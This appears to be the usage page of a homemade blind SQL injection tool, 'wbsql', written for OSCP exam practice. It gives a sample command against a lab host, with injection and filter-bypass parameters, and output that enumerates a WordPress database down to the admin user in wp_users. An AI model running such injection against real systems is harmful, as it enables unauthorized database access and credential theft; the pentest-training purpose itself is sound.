#### Use case

    This module is for blind SQL injection.
    SQLmap is a better andmore robust alternative, however,
    we are not allowed to use automation tools on the OSCP.
    Therefore, I created this custom module for my own usage.

#### Sample module wbsql
    wbsql -rh 10.11.1.251 -if burpRequest.txt -t "t')" -wd "/**/" -co "#" -hp 127.0.0.1:8080 -pps 11
    Options:

    1: Get database version
    2: Get current database name
    3: List all databases
    4: List tables from database
    5: List columns from a table
    6: Get row values for a column from a table from a database
    Type 'exit' to exit


    Select an option (numerical value): 1
    Total time: 12.04956007 seconds
    Database version: 5.7.27-0ubuntu0.18.04.1
    Options:

    1: Get database version
    2: Get current database name
    3: List all databases
    4: List tables from database
    5: List columns from a table
    6: Get row values for a column from a table from a database
    Type 'exit' to exit


    Select an option (numerical value): 2
    Total time: 8.15279603004 seconds
    Current database name: wordpress
    Options:

    1: Get database version
    2: Get current database name
    3: List all databases
    4: List tables from database
    5: List columns from a table
    6: Get row values for a column from a table from a database
    Type 'exit' to exit


    Select an option (numerical value): 3
    Total time: 27.0059490204 seconds
    Databases:
    information_schema
    mysql
    performance_schema
    sys
    wordpress

    Options:

    1: Get database version
    2: Get current database name
    3: List all databases
    4: List tables from database
    5: List columns from a table
    6: Get row values for a column from a table from a database
    Type 'exit' to exit


    Select an option (numerical value): 4
    Enter a database name: wordpress
    Total time: 1.13 minutes
    Tables in wordpress:
    wp_commentmeta
    wp_comments
    wp_links
    wp_options
    wp_postmeta
    wp_posts
    wp_term_relationships
    wp_term_taxonomy
    wp_termmeta
    wp_terms
    wp_usermeta
    wp_users

    Options:

    1: Get database version
    2: Get current database name
    3: List all databases
    4: List tables from database
    5: List columns from a table
    6: Get row values for a column from a table from a database
    Type 'exit' to exit


    Select an option (numerical value): 5
    Enter a database name: wordpress
    Enter a table name: wp_users
    Total time: 51.7088720798 seconds
    Columns in wordpress.wp_users:
    ID
    user_login
    user_pass
    user_nicename
    user_email
    user_url
    user_registered
    user_activation_key
    user_status
    display_name

    Options:

    1: Get database version
    2: Get current database name
    3: List all databases
    4: List tables from database
    5: List columns from a table
    6: Get row values for a column from a table from a database
    Type 'exit' to exit


    Select an option (numerical value): 6
    Enter a database name: wordpress
    Enter a table name: wp_users
    Enter a column name: user_login
    Total time: 7.48961114883 seconds
    Row values for user_login in wordpress.wp_users:
    admin

    Options:

    1: Get database version
    2: Get current database name
    3: List all databases
    4: List tables from database
    5: List columns from a table
    6: Get row values for a column from a table from a database
    Type 'exit' to exit


    Select an option (numerical value): exit

##### _All modules have helper flags -h and --help for more assistance._